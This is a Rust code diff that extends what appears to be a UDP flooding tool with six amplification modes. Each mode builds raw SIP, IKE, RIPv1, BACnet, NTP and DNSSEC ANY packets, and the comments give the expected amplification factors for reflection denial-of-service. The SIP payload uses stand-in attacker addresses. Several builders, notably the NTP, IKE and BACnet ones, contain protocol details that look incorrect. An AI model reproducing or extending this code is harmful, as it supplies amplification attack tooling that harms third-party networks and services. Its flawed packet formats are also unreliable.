@@ -20,6 +20,12 @@ pub enum UdpMode {
     NetbiosNs,
     MdnsQuery,
     TftpRead,
+    SipOptions,
+    IkeAmplification,
+    RipQuery,
+    BacnetDiscovery,
+    NtpReadVar,
+    DnsDnssec,
     GenericUdp,
 }
 
@@ -43,6 +49,12 @@ impl UdpMode {
             UdpMode::NetbiosNs => "NetBIOS Name Service query",
             UdpMode::MdnsQuery => "mDNS query",
             UdpMode::TftpRead => "TFTP read request",
+            UdpMode::SipOptions => "SIP OPTIONS amplification",
+            UdpMode::IkeAmplification => "IKE SA INIT amplification",
+            UdpMode::RipQuery => "RIPv1 routing table dump",
+            UdpMode::BacnetDiscovery => "BACnet device discovery",
+            UdpMode::NtpReadVar => "NTP READVAR amplification",
+            UdpMode::DnsDnssec => "DNS DNSSEC query amplification",
             UdpMode::GenericUdp => "UDP datagram flood",
         }
     }
@@ -63,6 +75,12 @@ impl UdpMode {
             UdpMode::NetbiosNs => 137,
             UdpMode::MdnsQuery => 5353,
             UdpMode::TftpRead => 69,
+            UdpMode::SipOptions => 5060,
+            UdpMode::IkeAmplification => 500,
+            UdpMode::RipQuery => 520,
+            UdpMode::BacnetDiscovery => 47808,
+            UdpMode::NtpReadVar => 123,
+            UdpMode::DnsDnssec => 53,
             UdpMode::GenericUdp => 12345,
         }
     }
@@ -86,6 +104,12 @@ impl UdpMode {
             "netbios" | "netbios-ns" => Some(UdpMode::NetbiosNs),
             "mdns" | "mdns-query" => Some(UdpMode::MdnsQuery),
             "tftp" | "tftp-read" => Some(UdpMode::TftpRead),
+            "sip" | "sip-options" => Some(UdpMode::SipOptions),
+            "ike" | "ike-amplification" | "isakmp" => Some(UdpMode::IkeAmplification),
+            "rip" | "rip-query" | "ripv1" => Some(UdpMode::RipQuery),
+            "bacnet" | "bacnet-discovery" | "bacnet-device" => Some(UdpMode::BacnetDiscovery),
+            "ntp-readvar" | "ntpreadvar" => Some(UdpMode::NtpReadVar),
+            "dns-dnssec" | "dnssec" | "dnssec-query" => Some(UdpMode::DnsDnssec),
             "udp-generic" | "generic" => Some(UdpMode::GenericUdp),
             _ => None,
         }
@@ -431,6 +455,12 @@ async fn run_udp_protocol(mode: UdpMode, host: &str, port: u16) -> Result<(usize
         UdpMode::NetbiosNs => build_netbios_ns(),
         UdpMode::MdnsQuery => build_mdns_query(),
         UdpMode::TftpRead => build_tftp_read(),
+        UdpMode::SipOptions => build_sip_options(),
+        UdpMode::IkeAmplification => build_ike_sa_init(),
+        UdpMode::RipQuery => build_rip_query(),
+        UdpMode::BacnetDiscovery => build_bacnet_whois(),
+        UdpMode::NtpReadVar => build_ntp_readvar(),
+        UdpMode::DnsDnssec => build_dns_dnssec(),
         UdpMode::GenericUdp => {
             // Send a small datagram, read what comes back
             let sent = socket.send_to(b"hello", &target_addr)
@@ -826,6 +856,234 @@ fn build_tftp_read() -> Vec<u8> {
     pkt.push(0x00);
     pkt.extend_from_slice(b"0");
     pkt.push(0x00);
+
+    pkt
+}
+
+// ================================================================
+// SIP OPTIONS request /5060 — requests VoIP server capabilities
+// Response includes full feature list, methods, extensions
+// Amplification: 10-30x
+// ================================================================
+fn build_sip_options() -> Vec<u8> {
+    // SIP OPTIONS request to server
+    // Uses basic SIP headers with a short User-Agent
+    let msg = b"OPTIONS sip:localhost SIP/2.0\r\n\
+Via: SIP/2.0/UDP 192.168.1.1:5060;branch=z9hG4bK0001\r\n\
+Max-Forwards: 70\r\n\
+From: <sip:attacker@attacker.net>;tag=12345\r\n\
+To: <sip:target@target.net>\r\n\
+Call-ID: abcdefgh-1234-5678-9012-ijklmnopqrst\r\n\
+CSeq: 1 OPTIONS\r\n\
+Contact: <sip:attacker@attacker.net>\r\n\
+Content-Length: 0\r\n\
+\r\n";
+    msg.to_vec()
+}
+
+// ================================================================
+// IKE SA INIT /500 — requests VPN gateway capabilities
+// Initiates IKEv1 or IKEv2 security association
+// Amplification: 2-5x
+// ================================================================
+fn build_ike_sa_init() -> Vec<u8> {
+    // IKEv1 Main Mode SA init packet (ISAKMP header + SA payload)
+    // A small initiate that triggers a larger response with transforms
+    let mut pkt = Vec::new();
+
+    // ISAKMP header (28 bytes)
+    // Initiator SPI (8 bytes) — random
+    for _ in 0..8 {
+        pkt.push(rand::random::<u8>());
+    }
+    // Responder SPI (8 bytes) — zero
+    for _ in 0..8 {
+        pkt.push(0x00);
+    }
+    // Next payload: 1 (SA)
+    pkt.push(0x01);
+    // Version: 1.0 (0x10)
+    pkt.push(0x10);
+    // Exchange type: 2 (Identity Protection / Main Mode)
+    pkt.push(0x02);
+    // Flags: 0 (no encryption, no commit)
+    pkt.push(0x00);
+    // Message ID: 0
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
+    // Length: placeholder (will be 28 + SA payload ~40 = ~68)
+    pkt.extend_from_slice(&[0x00, 0x44]);
+
+    // SA payload (next payload: 0 = none, reserved, length)
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x08]);
+    // DOI: 1 (IPsec)
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]);
+    // Situation: 1
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]);
+
+    // Proposal payload (next payload: 3 = transform, reserved, length)
+    pkt.extend_from_slice(&[0x03, 0x00, 0x00, 0x14]);
+    // Proposal #1, Protocol 1 (IKE)
+    pkt.push(0x01); // proposal #
+    pkt.push(0x01); // protocol ID (IKE)
+    pkt.push(0x00); // SPI size
+    pkt.push(0x02); // # of transforms
+
+    // Transform 1: ENCR_3DES
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x0c]);
+    pkt.push(0x01); // transform #1
+    pkt.push(0x01); // transform ID (Encryption Algorithm)
+    pkt.push(0x00); // reserved
+    pkt.push(0x00);
+    pkt.extend_from_slice(&[0x00, 0x00, 0x80, 0x03]); // 3DES-CBC
+
+    pkt
+}
+
+// ================================================================
+// RIPv1 routing table request /520 — requests all routing entries
+// Triggers response with full routing table (every route = 20 bytes)
+// Amplification: 5-10x
+// ================================================================
+fn build_rip_query() -> Vec<u8> {
+    // RIPv1 command request for entire routing table
+    // Command: 1 (request), Version: 1
+    // Requesting everything: AFI=0, route tag=0
+    let mut pkt = Vec::new();
+    // Command: 1 = request
+    pkt.push(0x01);
+    // Version: 1
+    pkt.push(0x01);
+    // Must be zero (2 bytes)
+    pkt.extend_from_slice(&[0x00, 0x00]);
+
+    // RTE (Route Table Entry) — request all routes
+    // Address Family Identifier: 0 (request full routing table)
+    // Route Tag: 0
+    // IP Address: 0.0.0.0
+    // Subnet Mask: 0.0.0.0
+    // Next Hop: 0.0.0.0
+    // Metric: 16 (unreachable / infinity — triggers response)
+    pkt.extend_from_slice(&[0x00, 0x00]); // AFI = 0
+    pkt.extend_from_slice(&[0x00, 0x00]); // route tag = 0
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // IP = 0.0.0.0
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // mask = 0.0.0.0
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // next hop = 0.0.0.0
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x10]); // metric = 16
+
+    pkt
+}
+
+// ================================================================
+// BACnet Who-Is /47808 — discovers all BACnet devices on network
+// Each device responds with device object properties
+// Amplification: 3-8x per device
+// ================================================================
+fn build_bacnet_whois() -> Vec<u8> {
+    // BACnet Who-Is request (BVLL + NPDU + APDU)
+    // BVLL: BACnet Virtual Link Layer (6 bytes header)
+    // NPDU: Network Protocol Data Unit
+    // APDU: Who-Is request
+    let mut pkt = Vec::new();
+
+    // BVLL header (type 0x81 = BACnet/IP, function 0x0a = Unicast)
+    pkt.push(0x81); // BVLC type
+    pkt.push(0x0a); // BVLC function (original-unicast)
+    pkt.extend_from_slice(&[0x00, 0x1a]); // BVLL length (26 bytes)
+    // NPDU
+    pkt.push(0x01); // version 1
+    pkt.push(0x00); // control (no options)
+    // APDU — Who-Is request
+    pkt.push(0x01); // APDU type (Confirmed-REQ), PDU flags
+    pkt.push(0x00); // segmented response accepted, max APDU
+    pkt.push(0x00); // invoke ID
+    // Service choice: Who-Is (0x08)
+    pkt.push(0x08);
+    // No parameters — Who-Is with no range means ask all devices
+    // Trailing BACnet tag: 0x0f (opening tag 7) + 0x1f (closing tag 7) = end of PDU
+    pkt.push(0x0f); // opening tag 7
+    pkt.push(0x1f); // closing tag 7
+
+    pkt
+}
+
+// ================================================================
+// NTP READVAR /123 — requests NTP server configuration variables
+// Response includes all config variables (version, peers, refclock)
+// Amplification: 20-50x
+// ================================================================
+fn build_ntp_readvar() -> Vec<u8> {
+    // NTP mode 7 (private) READVAR request
+    // Sends a READVAR with "assoc=0" to get server configuration
+    // Format: NTP mode 7 header + implementation + request code + payload
+    let mut pkt = Vec::new();
+
+    // NTP v4 mode 7 header byte
+    pkt.push(0x27); // LI=0, VN=4, Mode=7
+
+    // Implementation: 0 (NTP implementation)
+    pkt.push(0x00);
+    // Request code: 2 (READVAR)
+    pkt.push(0x02);
+    // auth_flag(2)=0, sequence(6)=0
+    pkt.push(0x00);
+    // Auth key ID: 0
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
+    // Reserved/offset: 0
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
+
+    // Data: "assoc=0" — request variables for first association
+    // NTP mode 7 data format: {data_len(2-bytes big-endian), data...}
+    pkt.extend_from_slice(&[0x00, 0x07]); // 7 bytes of data
+    pkt.extend_from_slice(b"assoc=0");
+
+    pkt
+}
+
+// ================================================================
+// DNS DNSSEC query /53 — requests DNS with DNSSEC OK bit set
+// DNSSEC-signed responses include RRSIG, DNSKEY, NSEC records
+// Amplification: 40-70x
+// ================================================================
+fn build_dns_dnssec() -> Vec<u8> {
+    // Standard DNS query with DNSSEC OK (DO) bit set in EDNS0
+    // + additional section with OPT pseudo-record
+    let mut pkt = Vec::new();
+
+    // Transaction ID
+    let tid: u16 = rand::random();
+    pkt.extend_from_slice(&tid.to_be_bytes());
+    // Flags: standard query + RD=1
+    pkt.extend_from_slice(&[0x01, 0x00]);
+    // QDCOUNT: 1
+    pkt.extend_from_slice(&[0x00, 0x01]);
+    // ANCOUNT, NSCOUNT, ARCOUNT: 0, 0, 1 (1 = OPT record in additional)
+    let arcount: u16 = 1;
+    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
+    pkt.extend_from_slice(&arcount.to_be_bytes());
+
+    // Query: google.com type=ANY class=IN
+    // Query name as length-prefixed labels
+    pkt.extend_from_slice(b"\x06google\x03com\x00");
+    // QTYPE: ANY (255) — ANY for max amplification with DNSSEC
+    pkt.extend_from_slice(&[0x00, 0xFF]);
+    // QCLASS: IN (1)
+    pkt.extend_from_slice(&[0x00, 0x01]);
+
+    // OPT pseudo-record (EDNS0)
+    // Name: root (0)
+    pkt.push(0x00);
+    // Type: OPT (41)
+    pkt.extend_from_slice(&[0x00, 0x29]);
+    // UDP payload size: 4096 (request large response)
+    pkt.extend_from_slice(&[0x10, 0x00]);
+    // Extended RCODE: 0
+    pkt.push(0x00);
+    // EDNS0 version: 0
+    pkt.push(0x00);
+    // Flags: DO bit (bit 15) — DNSSEC OK
+    pkt.extend_from_slice(&[0x80, 0x00]);
+    // Data length: 0
+    pkt.extend_from_slice(&[0x00, 0x00]);
 
     pkt
 }
